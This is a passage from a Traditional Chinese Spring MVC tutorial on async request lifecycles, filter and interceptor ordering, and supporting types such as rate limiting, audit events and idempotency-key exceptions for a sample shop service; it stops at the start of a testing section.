| 回傳型別 | 誰執行工作 | 適合 | 章節 |
|---|---|---|---|
| `Callable<T>` | Spring MVC 的 `AsyncTaskExecutor` | 「同步邏輯但不想佔 Tomcat 執行緒」 | 4.5.7 |
| `DeferredResult<T>` | **你自己**（任何執行緒） | 等待外部事件（webhook 回拋、長輪詢） | 05 章 |
| `SseEmitter` / `StreamingResponseBody` | 你自己，而且會多次寫入 | 串流、推播 | 05 章 |

### 4.12.2 完整的時間軸

```
① REQUEST dispatch（http-nio-8080-exec-7）
   ├─ Filter chain 正向
   │    TraceIdFilter：MDC.put(traceId)
   ├─ DispatcherServlet
   │    ├─ Interceptor.preHandle()
   │    ├─ Controller 回傳 Callable
   │    ├─ WebAsyncManager.startCallableProcessing()
   │    │     └─ 提交給 AsyncTaskExecutor（MdcTaskDecorator 複製 MDC）
   │    └─ Interceptor.afterConcurrentHandlingStarted()
   │         ★ 取代 postHandle + afterCompletion
   └─ Filter chain 反向
        TraceIdFilter 的 finally：MDC.remove(traceId)      ⚠️ MDC 清掉了
   （HTTP 連線保持開啟，但 Tomcat 執行緒被釋放）

② 背景執行緒（shop-mvc-async-1）
   MdcTaskDecorator 設定 MDC（來自 ①）
   執行 Callable.call()
     └─ log 有 traceId ✅
   MdcTaskDecorator 清理 MDC
   結果存進 WebAsyncManager，觸發 ASYNC dispatch

③ ASYNC dispatch（http-nio-8080-exec-12，可能是不同執行緒！）
   ├─ Filter chain 正向
   │    TraceIdFilter（shouldNotFilterAsyncDispatch()=false → ★ 真的會再跑一次）
   │      ⚠️ 「已執行過」attribute 已經在 REQUEST dispatch 的 finally 裡被移除了，
   │         所以它【不會】阻止重跑（4.4.6 的完整說明）
   │      → 所以 TraceIdFilter 自己要做冪等（4.5.4 的 resolveOnce）
   ├─ DispatcherServlet
   │    ├─ Interceptor.preHandle()        ★ 第二次！（4.7.4）
   │    ├─ 把 Callable 的結果序列化成 JSON
   │    ├─ Interceptor.postHandle()
   │    └─ Interceptor.afterCompletion()
   └─ Filter chain 反向
```

**這張圖揭露了四個踩點**：

| # | 踩點 | 解法 |
|---|---|---|
| 1 | MDC 在 ① 結束時被清掉 | `MdcTaskDecorator`（4.5.7） |
| 2 | `preHandle` 在 ③ 被呼叫第二次 | `OncePerRequestInterceptor`（4.7.4） |
| 3 | ③ 的執行緒與 ① 不同 | 不要用 `ThreadLocal` 傳遞業務狀態 |
| 4 | 逾時沒設會佔住連線 | `configurer.setDefaultTimeout(30_000)`（4.5.7） |

### 4.12.3 一個實測腳本

**與其相信這張圖，不如自己印出來。**

```java
package example.shop.playground;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.slf4j.MDC;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

import java.util.concurrent.Callable;

/** 用來觀察非同步生命週期的探測端點。讀完 4.12 就可以刪掉。 */
@RestController
public class AsyncProbeController {

    private static final Logger log = LoggerFactory.getLogger(AsyncProbeController.class);

    @GetMapping("/probe/sync")
    public String sync() {
        log.info("同步端點 thread={} traceId={}",
                Thread.currentThread().getName(), MDC.get("traceId"));
        return "sync";
    }

    @GetMapping("/probe/async")
    public Callable<String> async() {
        log.info("Controller 方法 thread={} traceId={}",
                Thread.currentThread().getName(), MDC.get("traceId"));

        return () -> {
            log.info("Callable 內部 thread={} traceId={}",
                    Thread.currentThread().getName(), MDC.get("traceId"));
            Thread.sleep(200);
            return "async";
        };
    }
}
```

```bash
curl -s localhost:8080/probe/async
```

**沒有 `MdcTaskDecorator` 時**：

```
INFO [4f2c8a1e9b7d3f60] AsyncProbeController - Controller 方法 thread=http-nio-8080-exec-7 traceId=4f2c8a1e9b7d3f60
INFO []                 AsyncProbeController - Callable 內部 thread=shop-mvc-async-1 traceId=null
     ↑ 空的
```

**有 `MdcTaskDecorator` 時**：

```
INFO [4f2c8a1e9b7d3f60] AsyncProbeController - Controller 方法 thread=http-nio-8080-exec-7 traceId=4f2c8a1e9b7d3f60
INFO [4f2c8a1e9b7d3f60] AsyncProbeController - Callable 內部 thread=shop-mvc-async-1 traceId=4f2c8a1e9b7d3f60
     ↑ 有了 ✅
```

**加上 interceptor 的日誌，可以看到 `preHandle` 被呼叫兩次**：

```java
package example.shop.playground;

import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Component;
import org.springframework.web.servlet.AsyncHandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;

/** 觀察 interceptor 生命週期。讀完 4.12 就可以刪掉。 */
@Component
public class LifecycleProbeInterceptor implements AsyncHandlerInterceptor {

    private static final Logger log = LoggerFactory.getLogger(LifecycleProbeInterceptor.class);

    @Override
    public boolean preHandle(HttpServletRequest req, HttpServletResponse res, Object handler) {
        log.info("preHandle dispatcherType={} thread={}",
                req.getDispatcherType(), Thread.currentThread().getName());
        return true;
    }

    @Override
    public void postHandle(HttpServletRequest req, HttpServletResponse res,
                          Object handler, ModelAndView mav) {
        log.info("postHandle dispatcherType={}", req.getDispatcherType());
    }

    @Override
    public void afterCompletion(HttpServletRequest req, HttpServletResponse res,
                               Object handler, Exception ex) {
        log.info("afterCompletion dispatcherType={} ex={}",
                req.getDispatcherType(), (ex == null) ? "-" : ex.getClass().getSimpleName());
    }

    @Override
    public void afterConcurrentHandlingStarted(HttpServletRequest req,
                                               HttpServletResponse res, Object handler) {
        log.info("afterConcurrentHandlingStarted dispatcherType={}", req.getDispatcherType());
    }
}
```

**輸出**：

```
preHandle dispatcherType=REQUEST thread=http-nio-8080-exec-7
Controller 方法 thread=http-nio-8080-exec-7
afterConcurrentHandlingStarted dispatcherType=REQUEST         ← 不是 postHandle！
Callable 內部 thread=shop-mvc-async-1
preHandle dispatcherType=ASYNC thread=http-nio-8080-exec-12   ← 第二次
postHandle dispatcherType=ASYNC
afterCompletion dispatcherType=ASYNC ex=-
```

> **這個實測腳本比任何文件可靠。**
> 把它加進專案（或至少存在你的筆記裡），
> 升級 Spring 版本時跑一次，就知道行為有沒有變。

### 4.12.4 非同步破壞了哪些假設

| 你原本的假設 | 非同步下為什麼不成立 |
|---|---|
| 「一個請求一條執行緒」 | 至少三條：REQUEST、背景工作、ASYNC dispatch |
| 「`ThreadLocal` 能傳遞請求範圍的狀態」 | 換執行緒就沒了（MDC、`SecurityContextHolder`、`RequestContextHolder`） |
| 「`finally` 執行時請求已結束」 | ① 的 `finally` 執行時請求還沒結束 |
| 「Interceptor 的 `preHandle` 一次請求一次」 | 兩次 |
| 「例外會進 advice」 | 背景執行緒拋的例外不會（第 00 章 0.8.2 情況 5） |
| 「`@Transactional` 能跨越回傳」 | 交易在 ① 就提交了；背景工作在交易外 |

⚠️ **最後一項是最危險的**：

```java
// ❌ 交易已經提交，Callable 裡的 lazy 載入會失敗
@Transactional
@GetMapping("/orders/{id}")
public Callable<OrderDetail> get(@PathVariable String id) {
    Order order = orderRepository.findById(id).orElseThrow();
    return () -> mapper.toDetail(order);      // ← LazyInitializationException
}
```

**這是第 00 章 0.6.4 的「`@Transactional` 不該在 Controller」的另一個具體理由。**

---

## 4.13 shop-service 的完整清單

### 4.13.1 Filter

| order | 類別 | 職責 | 章節 |
|---|---|---|---|
| `MIN_VALUE` | `ForwardedHeaderFilter`（Boot） | `X-Forwarded-*` | 01 章 1.11.4 |
| `MIN_VALUE` | `CharacterEncodingFilter`（Boot） | UTF-8 | — |
| `MIN_VALUE+1` | `ServerHttpObservationFilter`（Boot） | metrics / tracing | 4.5.5 |
| **-121** | `TraceIdFilter` | traceId → MDC + 回應 header | **4.5** |
| **-120** | `TrailingSlashRedirectFilter` | `/orders/` → 308 → `/orders` | 01 章 1.3.5 |
| **-119** | `IpRateLimitFilter` | 依 IP 的粗粒度限流 | 4.16 練習 3 |
| **-118** | `RequestSizeLimitFilter` | body 大小上限 | 02 章 2.11.2 |
| **-117** | `CachedBodyFilter` | 讓 JSON body 可重複讀 | **4.4.6** |
| **-116** | `RequestLoggingFilter` | 三層請求日誌 | **4.6** |
| **-115** | `AuditFilter` | 稽核事件（非同步寫入） | 4.16 練習 2 |
| -105 | `RequestContextFilter`（Boot） | `RequestContextHolder` | — |
| **-100** | `springSecurityFilterChain` | 認證、授權、CORS | 06 章、09 站 |
| **-99** | `IdempotencyFilter` | 捕捉回應以便重播 | **4.9.5** |
| -9900 | `FormContentFilter`（Boot） | `PUT`/`PATCH` 的 form | 01 章 1.5.4 |

### 4.13.2 Interceptor（順序 = 註冊順序）

| # | 類別 | 職責 | 章節 |
|---|---|---|---|
| 1 | `ActorMdcInterceptor` | actorId / actorType → MDC | 4.7.5 |
| 2 | `RateLimitInterceptor` | 依使用者 + 端點的細粒度限流 | 4.16 練習 3 |
| 3 | `UnknownQueryParamInterceptor` | 拒絕未知查詢參數 | 01 章 1.7.5 |
| 4 | `PageableGuardInterceptor` | 分頁硬上限、深分頁、多值上限 | **4.8** |
| 5 | `IdempotencyInterceptor` | 冪等鍵的決策 | **4.9.4** |

⚠️ **順序的理由**：
`ActorMdcInterceptor` 最先（讓後面的例外 log 也有 actorId）；
`RateLimitInterceptor` 第二（**在昂貴的檢查之前擋掉超量請求**）；
`IdempotencyInterceptor` 最後（它會查資料庫，最貴）。

### 4.13.3 ArgumentResolver

| 類別 | 解析什麼 | 章節 |
|---|---|---|
| `CurrentActorArgumentResolver` | `@CurrentActor Actor` | 4.10.2 |
| `RequestContextArgumentResolver` | `RequestContext` | 4.10.3 |

### 4.13.4 Aspect

| 類別 | 職責 | 章節 |
|---|---|---|
| `TimedAspect`（Micrometer 內建） | `@Timed` 的方法耗時 | 4.11.2 |

### 4.13.5 「這件事該放哪一層」的最終速查

| 需求 | 機制 | 為什麼不是別的 |
|---|---|---|
| traceId | Filter (-121) | Interceptor 涵蓋不到 404 / 401 |
| 請求日誌 | Filter (-116) | 需要讀 body、需要涵蓋所有請求 |
| body 可重複讀 | Filter (-117) | 只有 Filter 能包裝 request |
| 依 IP 限流 | Filter (-119) | 要在認證之前，避免浪費 JWT 驗證的 CPU |
| 依使用者限流 | Interceptor | 需要 Security 之後 + 讀端點註解 |
| 分頁上限 | Interceptor | 需要在綁定前，但只針對 Controller |
| 未知參數 | Interceptor | 需要讀 handler 的參數清單 |
| 冪等 | Filter + Interceptor | 需要包裝（Filter）+ 讀註解（Interceptor） |
| 注入 Actor | ArgumentResolver | 它就是為此存在 |
| 統一回應包裝 / 欄位篩選 | `ResponseBodyAdvice` | 06 章會用到 |
| Service 耗時 | AOP | 只有 AOP 能作用在 Service |
| 交易 | AOP（`@Transactional`） | 05-service |

### 4.13.6 支援型別：前面用到但還沒定義的東西

**00～04 章的程式碼引用了幾個「一直被使用但沒被定義」的型別。**
這一節把它們補完，讓專案真的能編譯。

#### `CurrentUser`：Security 的 principal

00、01、04 章的 Controller 簽章一直出現 `@AuthenticationPrincipal CurrentUser user`。

```java
package example.shop.security;

import example.shop.order.domain.Actor;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.userdetails.UserDetails;

import java.util.Collection;
import java.util.List;
import java.util.Set;

/**
 * 認證後的 principal。
 *
 * <p>★ 它是 <b>Security 層</b>的型別 —— Controller 不該直接用它，
 * 而是透過 {@code @CurrentActor Actor}（4.10.2）拿到領域型別。
 * 這個類別存在的意義是「Spring Security 需要一個 UserDetails」。
 *
 * <p>完整的認證流程（怎麼從 JWT 建立它）在 09-spring-security；
 * 這裡只定義結構，讓 04 章的程式碼能編譯與測試。
 */
public record CurrentUser(
    String subjectId,
    String displayName,
    Actor.ActorType actorType,
    /**
     * ★★ <b>裸的角色名稱，不含 {@code ROLE_} 前綴。</b>
     *
     * <p>例：{@code Set.of("CUSTOMER")}，<b>不是</b> {@code Set.of("ROLE_CUSTOMER")}。
     *
     * <p>因為 {@link #getAuthorities()} 會自己加前綴。傳入已經帶前綴的值會變成
     * {@code ROLE_ROLE_CUSTOMER} —— 而後果是
     * <b>{@code hasRole("CUSTOMER")} 全部失敗、所有端點回 403</b>。
     *
     * <p>⚠️ 這個 bug 在測試裡特別容易發生（07 章 7.4.3 的 {@code WithActor}
     * 與 7.9.3 的 {@code Auth.as} 都要傳這個集合）。
     * 它的症狀是「授權矩陣的每一格都是 403」——
     * 看起來像「Security 設定壞了」，其實是多了三個字。
     */
    Set<String> roles,
    Set<String> scopes,
    String tokenId
) implements UserDetails {

    public CurrentUser {
        roles = (roles == null) ? Set.of() : Set.copyOf(roles);
        scopes = (scopes == null) ? Set.of() : Set.copyOf(scopes);
    }

    /** ★ 翻譯成領域型別。這是 CurrentActorArgumentResolver 唯一用到的方法。 */
    public Actor actor() {
        return new Actor(actorType, subjectId, displayName);
    }

    /** 給 mapper 決定回應要用顧客版還是客服版 DTO（01 章 1.12.2）。 */
    public String role() {
        return roles.stream().findFirst().orElse("CUSTOMER");
    }

    // ── UserDetails ──────────────────────────────────────────────

    @Override
    public Collection<? extends GrantedAuthority> getAuthorities() {
        // ★ Spring Security 的 hasRole('X') 會比對 "ROLE_X"
        return java.util.stream.Stream.concat(
                        roles.stream().map(r -> new SimpleGrantedAuthority("ROLE_" + r)),
                        scopes.stream().map(s -> new SimpleGrantedAuthority("SCOPE_" + s)))
                .map(GrantedAuthority.class::cast)
                .toList();
    }

    /** ★ 我們用 JWT，沒有密碼。回 null 而不是空字串（避免被誤用於比對）。 */
    @Override public String getPassword()               { return null; }
    @Override public String getUsername()               { return subjectId; }
    @Override public boolean isAccountNonExpired()      { return true; }
    @Override public boolean isAccountNonLocked()       { return true; }
    @Override public boolean isCredentialsNonExpired()  { return true; }
    @Override public boolean isEnabled()                { return true; }

    /** 測試用的建構捷徑。 */
    public static CurrentUser customer(String customerId) {
        return new CurrentUser(customerId, "測試客戶",
                Actor.ActorType.CUSTOMER, Set.of("CUSTOMER"), Set.of(), "tok_test");
    }

    public static CurrentUser support(String staffId) {
        return new CurrentUser(staffId, "測試客服",
                Actor.ActorType.SUPPORT, Set.of("SUPPORT"), Set.of(), "tok_test");
    }
}
```

⚠️ **`record` 實作 `UserDetails` 有一個坑**：`UserDetails` 有 `getUsername()`，
而 record 的元件如果叫 `username` 會產生 `username()` 而不是 `getUsername()`。
所以這裡把元件命名為 `subjectId` 並手動實作 `getUsername()`。

#### `CurrentActorHolder`：在沒有方法參數的地方取 Actor

4.9.4 的 `IdempotencyInterceptor` 與練習 3 的 `RateLimitInterceptor` 都用了它 ——
因為 interceptor 沒有「方法參數」可以注入。

```java
package example.shop.common.web;

import example.shop.order.domain.Actor;
import example.shop.security.CurrentUser;
import org.springframework.security.authentication.AnonymousAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.context.SecurityContextHolder;

/**
 * 從 {@link SecurityContextHolder} 取得目前的 {@link Actor}。
 *
 * <p>★ 這是給「拿不到方法參數的地方」用的（Interceptor、Filter）。
 * <b>Controller 一律用 {@code @CurrentActor Actor}</b>（4.10.2）——
 * 那樣測試不用準備 SecurityContext。
 *
 * <p>⚠️ 不要在 Service 用它：那會讓 Service 依賴 Spring Security，
 * 而且排程任務沒有 SecurityContext（第 00 章 0.4.2）。
 * Service 要的 Actor 由 Controller 當參數傳進去。
 */
public final class CurrentActorHolder {

    /** @return 目前的 Actor，未認證時回 {@link Actor#ANONYMOUS} */
    public static Actor actor() {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();

        if (auth == null || !auth.isAuthenticated()
                || auth instanceof AnonymousAuthenticationToken) {
            return Actor.ANONYMOUS;
        }
        if (auth.getPrincipal() instanceof CurrentUser user) {
            return user.actor();
        }
        return Actor.ANONYMOUS;
    }

    /** 限流／冪等的分桶鍵用。未認證時回 "anonymous"。 */
    public static String actorIdOrAnonymous() {
        return actor().id();
    }

    private CurrentActorHolder() {}
}
```

⚠️ **`CurrentActorHolder` 用的是 `ThreadLocal`（`SecurityContextHolder` 的預設策略）。**
在非同步 dispatch 上它**可能是空的** —— Spring Security 有
`DelegatingSecurityContextAsyncTaskExecutor` 處理這件事，
但那要明確設定（4.5.7 的 `MdcTaskDecorator` 只搬 MDC，不搬 SecurityContext）。

**所以 4.7.4 的「ASYNC dispatch 跳過 preHandle」除了避免重複執行，
也順便避開了「拿不到 Actor」的問題。**

#### `RateLimiter`：限流的抽象

練習 3 有 `RedisRateLimiter implements RateLimiter`，但介面本身沒定義。

```java
package example.shop.common.web.ratelimit;

import java.time.Instant;

/**
 * 限流器。
 *
 * <p>抽成介面的理由：
 * <ul>
 *   <li>單機部署可以用記憶體版（{@code Caffeine}），不用架 Redis。</li>
 *   <li>測試用固定回應的 stub，不需要 Testcontainers。</li>
 * </ul>
 */
public interface RateLimiter {

    /**
     * 嘗試消耗一個配額。
     *
     * <p>★ 實作必須是<b>原子</b>的（練習 3 的競態 1）。
     *
     * @param key           分桶鍵（已含 scope 前綴，例如 {@code actor:cus_1:order-write}）
     * @param limit         時間窗內的上限
     * @param windowSeconds 時間窗長度（秒）
     */
    Decision tryConsume(String key, int limit, int windowSeconds);

    /**
     * 判斷結果。
     *
     * @param allowed           是否放行
     * @param limit             上限（回給 X-RateLimit-Limit）
     * @param remaining         剩餘配額（回給 X-RateLimit-Remaining）
     * @param resetAt           配額重置時間（回給 X-RateLimit-Reset）
     * @param retryAfterSeconds 建議多久後重試（回給 Retry-After）
     */
    record Decision(boolean allowed, int limit, int remaining,
                    Instant resetAt, int retryAfterSeconds) {

        public Decision {
            // ★ 防禦性：負的 remaining 會讓 header 變成 "-3"，客戶端可能解析失敗
            remaining = Math.max(0, remaining);
            retryAfterSeconds = Math.max(0, retryAfterSeconds);
        }
    }
}
```

**測試用的 stub**（比 mock Redis 簡單得多）：

```java
package example.shop.common.web.ratelimit;

import java.time.Instant;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicInteger;

/** 測試用：記憶體計數，不會過期。 */
public class InMemoryRateLimiter implements RateLimiter {

    private final Map<String, AtomicInteger> counters = new ConcurrentHashMap<>();

    @Override
    public Decision tryConsume(String key, int limit, int windowSeconds) {
        int current = counters.computeIfAbsent(key, k -> new AtomicInteger())
                              .incrementAndGet();
        boolean allowed = current <= limit;
        return new Decision(allowed, limit, limit - current,
                Instant.now().plusSeconds(windowSeconds), windowSeconds);
    }

    public void reset() { counters.clear(); }
}
```

#### `RateLimitProperties`

```java
package example.shop.common.web.ratelimit;

import jakarta.validation.constraints.Max;
import jakarta.validation.constraints.Min;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.validation.annotation.Validated;

@Validated
@ConfigurationProperties(prefix = "api.rate-limit")
public record RateLimitProperties(

    /** 第一層：每個 IP 的上限（未認證的暴力請求靠這個擋）。 */
    @Min(1) @Max(100_000) int ipLimit,
    @Min(1) @Max(3600)    int ipWindowSeconds,

    /** 第二層：沒有 @RateLimit 註解的端點用這個（安全的預設值）。 */
    @Min(1) @Max(100_000) int defaultActorLimit,
    @Min(1) @Max(3600)    int defaultWindowSeconds

) {
    public RateLimitProperties {
        if (ipLimit == 0)             ipLimit = 60;
        if (ipWindowSeconds == 0)     ipWindowSeconds = 60;
        if (defaultActorLimit == 0)   defaultActorLimit = 300;
        if (defaultWindowSeconds == 0) defaultWindowSeconds = 60;
    }
}
```

```yaml
api:
  rate-limit:
    ip-limit: 60
    ip-window-seconds: 60
    default-actor-limit: 300
    default-window-seconds: 60
```

#### `AuditEvent` 與 `AuditRepository`

練習 2 的修正版用了它們。

```java
package example.shop.common.audit;

import java.time.Instant;

/**
 * 稽核事件。
 *
 * <p>★ 是 record（不可變）而且欄位全是簡單型別 ——
 * 因為它會被丟進 {@code @Async} 的執行緒，共用可變狀態會出事。
 *
 * <p>⚠️ 刻意「沒有」的欄位：{@code Authorization} header、完整的回應 body。
 * 稽核紀錄通常保留數年，放進去等於長期洩漏（練習 2 的問題 6）。
 */
public record AuditEvent(
    String traceId,
    String httpMethod,
    String endpointTemplate,     // /orders/{orderId}（可聚合）
    String requestUri,           // /orders/ord_01J5GK（可查特定一筆）
    String maskedRequestBody,    // 已經過 BodyMasker，且已截斷
    int responseStatus,
    long durationMs,
    Instant occurredAt,
    String actorId,
    String clientIp
) {
    public AuditEvent {
        if (traceId == null || traceId.isBlank()) traceId = "unknown";
        if (occurredAt == null) occurredAt = Instant.now();
        // ★ 長度硬上限：防止某個路徑漏了截斷
        maskedRequestBody = truncate(maskedRequestBody, 8192);
        requestUri = truncate(requestUri, 2048);
        endpointTemplate = truncate(endpointTemplate, 512);
    }

    private static String truncate(String s, int max) {
        if (s == null) return null;
        return (s.length() <= max) ? s : s.substring(0, max);
    }
}
```

```java
package example.shop.common.audit;

/**
 * 稽核紀錄的儲存。實作在 06-repository。
 *
 * <p>⚠️ 這一層刻意極簡：稽核是 append-only，不需要更新或刪除。
 * 「不提供刪除方法」本身就是一個合規特性。
 */
public interface AuditRepository {
    void save(AuditEvent event);
}
```

#### 冪等相關的兩個例外

```java
package example.shop.common.error;

import java.util.Map;

/** 冪等鍵格式無效（04 章 4.9.4）。 */
public class InvalidIdempotencyKeyException extends BusinessException {
    public InvalidIdempotencyKeyException(int minLength, int maxLength) {
        super(ErrorCode.IDEMPOTENCY_KEY_REQUIRED,
              "The Idempotency-Key header is malformed.",
              null,
              Map.of("minLength", minLength,
                     "maxLength", maxLength,
                     "allowedCharacters", "A-Z a-z 0-9 _ : -",
                     "hint", "建議直接用 UUID。"),
              new Object[0],
              java.util.List.of());
    }
}
```

```java
package example.shop.common.error;

import java.util.Map;

/**
 * 請求 body 太大，無法計算冪等指紋（04 章 4.9.4）。
 *
 * <p>★ 為什麼不是「就不做冪等」而是拒絕請求？
 * 因為「以為有冪等保護但其實沒有」比「請求被拒絕」危險得多 ——
 * 前者會導致重複扣款（4.2.4）。
 */
public class IdempotencyBodyTooLargeException extends BusinessException {
    public IdempotencyBodyTooLargeException() {
        super(ErrorCode.PAYLOAD_TOO_LARGE,
              "The request body is too large to compute an idempotency fingerprint.",
              null,
              Map.of("hint", "請減少請求內容（例如拆成多筆訂單）。"),
              new Object[0],
              java.util.List.of());
    }
}
```

#### `IdempotencyKeyReusedException`：同一把鑰匙、不同的請求 ★

4.9.4 講了指紋比對，但**沒有給出比對失敗時拋的那個例外**。
它是整個冪等機制裡**最重要的一個**，值得完整寫出來。

```java
package example.shop.common.web;

import example.shop.common.error.BusinessException;
import example.shop.common.error.ErrorCode;

import java.time.Instant;
import java.util.List;

/**
 * 同一個 {@code Idempotency-Key} 被用在「內容不同」的請求上（4.9.4）。
 *
 * <p>★★ 為什麼這是 409 而不是 400：
 *
 * <p>請求本身完全合法 —— 格式對、欄位對、驗證通過。
 * 衝突的是**它與伺服器上已有的狀態**：
 * 「這把鑰匙已經開過另一扇門了」。
 * 那正是 409 Conflict 的定義。
 *
 * <p>★★ 而它為什麼是整個冪等機制裡最重要的例外：
 *
 * <p>如果這裡選擇「靜默回傳上一次的結果」（很多實作這樣做），
 * 那客戶端送了 A 訂單、拿到 B 訂單的回應，而且**看起來成功**。
 * 這比重複下單更糟 —— 重複下單至少看得出來。
 *
 * <p>三種可能的處理，只有第三種是對的：
 * <table>
 *   <tr><th></th><th>做法</th><th>後果</th></tr>
 *   <tr><td>🔴</td><td>回傳上一次的結果</td>
 *       <td>客戶端以為 A 成功了，實際上建立的是 B</td></tr>
 *   <tr><td>🔴</td><td>忽略冪等鍵，正常建立</td>
 *       <td>冪等保護形同虛設（客戶端可能是重試邏輯有 bug）</td></tr>
 *   <tr><td>✅</td><td><b>409 + 明確說明</b></td>
 *       <td>客戶端知道自己的重試邏輯壞了</td></tr>
 * </table>
 *
 * <p>⚠️ 這個錯誤幾乎總是**客戶端的 bug**（重用了鑰匙），
 *    所以 {@code userMessage} 要能讓對接的工程師看懂，
 *    而不是給終端使用者看的「請稍後再試」。
 */
public class IdempotencyKeyReusedException extends BusinessException {

    public IdempotencyKeyReusedException(String key) {
        this(key, null, null);
    }

    public IdempotencyKeyReusedException(String key, Instant firstUsedAt,
                                         String firstRequestPath) {
        super(ErrorCode.IDEMPOTENCY_KEY_REUSED,
              "The Idempotency-Key was already used for a request with different content.",
              null,
              // ★ 用父類別的 ext()（03 章 3.5.2 的統一範式）——
              //   它會自動略過 null 的值，所以兩個選填欄位不用自己判斷。
              ext("idempotencyKey", truncate(key),
                  "firstUsedAt", firstUsedAt == null ? null : firstUsedAt.toString(),
                  "firstRequestPath", firstRequestPath,
                  "hint", "每一個邏輯上不同的請求都要用新的 Idempotency-Key（建議 UUIDv4）。"
                        + "重試同一個請求時才重用同一把鑰匙。"),
              new Object[0],
              List.of());
    }

    /**
     * ★ 回傳 key 本身是安全的 —— 它是客戶端自己產生的，不是機密。
     *
     * <p>⚠️ 但仍然要截斷：4.9.3 已經驗證過長度，這是第二道防線
     *    （防止「驗證被繞過」或「未來有人放寬了長度限制」）。
     */
    private static String truncate(String key) {
        if (key == null) return null;
        return key.length() > 128 ? key.substring(0, 128) + "…" : key;
    }
}
```

⚠️ **`firstRequestPath` 這個欄位有一個取捨。**

它對除錯非常有用（「你這把鑰匙上次用在 `/orders`，這次用在 `/payments`」），
但它**透露了「這把鑰匙上一次做了什麼」**。

**判準**：`Idempotency-Key` 由客戶端產生，所以能猜到別人鑰匙的攻擊者
本來就需要先猜中一個 UUIDv4 —— 風險極低。
**但如果你的鑰匙是可預測的（例如訂單編號），就不要回傳這個欄位。**

**對應的錯誤訊息已經在 03 章 3.4.4 定義**：

```properties
error.IDEMPOTENCY_KEY_REUSED.title=冪等鍵重複使用
error.IDEMPOTENCY_KEY_REUSED.user=這個請求的識別碼已經用在另一個不同的請求上，請改用新的識別碼。
```

⚠️ **這裡只是引用，不要在自己的段落再寫一次** ——
properties 的同一個 key 只有<b>最後一次</b>定義生效，而 Spring 不會警告。
**一個 `ErrorCode` 的訊息只能有一個定義處（03 章 3.4.4）。**

#### `FilterProperties` 與 `RequestLoggingProperties` 的關係

⚠️ **4.4.5 定義了 `FilterProperties`，4.6.6 定義了 `RequestLoggingProperties`，
兩個都有「排除路徑」—— 這是設計冗餘。**

**shop-service 的收攏方式：`FilterProperties` 只留 filter 專屬的技術設定，
排除路徑統一由 `RequestLoggingProperties` 管**（因為只有日誌與稽核需要排除；
traceId 不排除任何路徑）。

```java
package example.shop.common.config;

import jakarta.validation.constraints.Max;
import jakarta.validation.constraints.Min;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.validation.annotation.Validated;

/** Filter 的技術參數。排除路徑見 {@code RequestLoggingProperties}（4.6.6）。 */
@Validated
@ConfigurationProperties(prefix = "api.filters")
public record FilterProperties(

    /** 可重複讀的 body 上限（4.4.6）。超過就標記 truncated。 */
    @Min(1024) @Max(10 * 1024 * 1024)
    int cachedBodyMaxBytes,

    /** 我們控制的反向代理層數（4.5.4 的 X-Forwarded-For 解析）。 */
    @Min(0) @Max(5)
    int trustedProxyCount

) {
    public FilterProperties {
        if (cachedBodyMaxBytes == 0) cachedBodyMaxBytes = 256 * 1024;
        // ⚠️ trustedProxyCount 的 0 是合法值（沒有代理），所以不能用 == 0 判斷「未設定」
    }
}
```

```yaml
api:
  filters:
    cached-body-max-bytes: 262144      # 256 KB
    trusted-proxy-count: 1             # Nginx 一層；加了 CDN 要改成 2
```

⚠️ **`trustedProxyCount` 從設定讀，而不是寫死在 `ClientIpResolver`**（4.14.2 的最後警告）。
這代表 `ClientIpResolver` 不能是 `static` 工具類，要變成一個 bean：

```java
package example.shop.common.web;

import example.shop.common.config.FilterProperties;
import jakarta.servlet.http.HttpServletRequest;
import org.springframework.stereotype.Component;

import java.util.List;

/** 4.5.4 / 4.14.2 的最終版：代理層數從設定讀。 */
@Component
public class ClientIpResolver {

    private final int trustedProxyCount;

    public ClientIpResolver(FilterProperties properties) {
        this.trustedProxyCount = properties.trustedProxyCount();
    }

    public String resolve(HttpServletRequest request) {
        String xff = request.getHeader("X-Forwarded-For");
        if (xff != null && !xff.isBlank() && trustedProxyCount > 0) {
            List<String> hops = java.util.Arrays.stream(xff.split(","))
                    .map(String::trim).filter(s -> !s.isEmpty()).toList();
            // ★ 從右往左數過我們控制的代理層（4.14.2 的修正版）
            int index = hops.size() - trustedProxyCount;
            if (index >= 0 && index < hops.size()) {
                return sanitizeIp(hops.get(index));
            }
        }
        return sanitizeIp(request.getRemoteAddr());
    }

    static String sanitizeIp(String ip) {
        if (ip == null) return "unknown";
        String trimmed = ip.trim();
        if (trimmed.isEmpty() || trimmed.length() > 45) return "invalid";
        for (int i = 0; i < trimmed.length(); i++) {
            char c = trimmed.charAt(i);
            boolean ok = (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f')
                    || (c >= 'A' && c <= 'F') || c == '.' || c == ':' || c == '%';
            if (!ok) return "invalid";
        }
        return trimmed;
    }
}
```

⚠️ **這個改動讓 4.5.4 的 `TraceIdFilter` 與練習 3 的 `IpRateLimitFilter`
都要改成注入 `ClientIpResolver` 而不是呼叫 static 方法。**
（4.5.4、4.10.3 與練習 3 的程式碼已經改成注入版；
如果你先前照抄了 static 版本，請跟著改。）

> **這一節示範了一件實務上很常見的事**：
> 前面為了「讓每一節可以獨立讀」而用了 static 工具方法，
> 但真正組裝專案時發現它需要設定 → 就得變成 bean。
>
> **這不是前面寫錯，而是「先讓概念清楚，再處理組裝」。**
> 重要的是**最後有一節把它收攏**，而不是留下兩種不一致的版本。


---

## 4.14 測試

### 4.14.1 Filter 的單元測試（不啟動 Spring）

```java
package example.shop.common.web;

import jakarta.servlet.FilterChain;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
